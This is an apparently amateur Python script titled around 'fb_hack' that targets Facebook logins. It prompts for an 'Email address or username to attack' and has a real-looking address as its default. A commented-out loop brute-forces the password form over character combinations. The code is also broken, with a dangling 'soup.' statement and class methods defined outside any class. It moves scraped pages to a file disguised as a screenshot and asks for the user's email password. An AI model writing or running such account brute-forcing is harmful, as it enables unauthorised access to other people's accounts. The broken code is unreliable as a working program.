from time import sleep
from bs4 import BeautifulSoup
import itertools, sys, requests, mechanize, os, re, email, smtplib, ssl, shutil
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
              'Chrome/7.0.517.41 Safari/534.7' 

def __init__(self):
    self.browser = self.setup_browser()

def setup_browser(self):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    browser.set_cookiejar(cookies)
    browser.addheaders = [('User-agent', MOZILLA_UAS)]
    browser.set_handle_refresh(False)
    return browser

def sleepy(counter):
  x = counter
  y = 0
  while x > y:
    x -= 1
    z = x
    if x <= 9:
      code = ("0", str(z))
      h = ""
      yo = h.join(code)
      x 
      print(yo, end='\r')
    else:
      print(x, end='\r')
    sleep(1)

def fb_hack(email, codex, respect):
  os.system('clear')
  soup = BeautifulSoup()
  browser = mechanize.Browser()
  browser.set_handle_robots(False)
  cookies = mechanize.CookieJar()
  browser.set_cookiejar(cookies)
  browser.addheaders = [('User-agent', MOZILLA_UAS)]
  browser.set_handle_refresh(False)
  browser.open('https://mbasic.facebook.com')
  #browser.select_form(nr=0)
  response1 = browser.response()
  soup = BeautifulSoup(response1, 'html.parser')
  mobile = soup.find(string=re.compile("mobile"))
  #browser.click(coord=(428,18))
  #browser.form['email'] = email
  #browser.submit()
  response1 = browser.response()
  soup = BeautifulSoup(response1, 'html.parser')
  with open("output1.html", "w") as file:
    file.write(str(soup))
  with open("output1.txt", "w") as file:
    file.write(str(soup))
  source_file = "output1.txt" 
  destination_folder = "/sdcard/movies/screenshot.png" 
  
  shutil.move(source_file, destination_folder)
  test = soup.
  """counter = 0
  for combination in itertools.product(["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","!","#","$","%","^","&","*"], repeat=int(respect)):
    p = (''.join(map(str, combination)))
    counter += 1
    if counter <= codex:
      print("working", end='\r')
    else:
      try:
        browser.form['pass'] = p
        browser.submit()
      except:
        response1 = browser.response()
        soup = BeautifulSoup(response1, 'html.parser')
        with open("output1.html", "w") as file:
          file.write(str(soup))
        with open("output1.txt", "w") as file:
          file.write(str(soup))
      could = int(counter)
      code1 = (str(could), str(p), "failed")
      code2 = (str(could), str(p), "check")
      h = " "
      yo = h.join(code1)
      yot = h.join(code2)
      response1 = browser.response()
      soup = BeautifulSoup(response1, 'html.parser')
      taw = soup.find(string="Try another way")
      if taw != "None":
        print(yo)
      else:
        print(yot)
        respect = 0
        break
      sleepy(30)
    
  browser.select_form(nr=0)
  forms = list(browser.forms())
  form = forms[0]
  print(form)"""
  past = int(respect)
  return past

os.system('clear')
ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
reset = int(input('Code: ') or 1)
past = int(input('Length: ') or 6)
sender_email = input("Your Email:")
receiver_email = input("Recipient:")
password = input("Type your password and press enter:")
fb_hack(ehack, reset, past)
past += 1
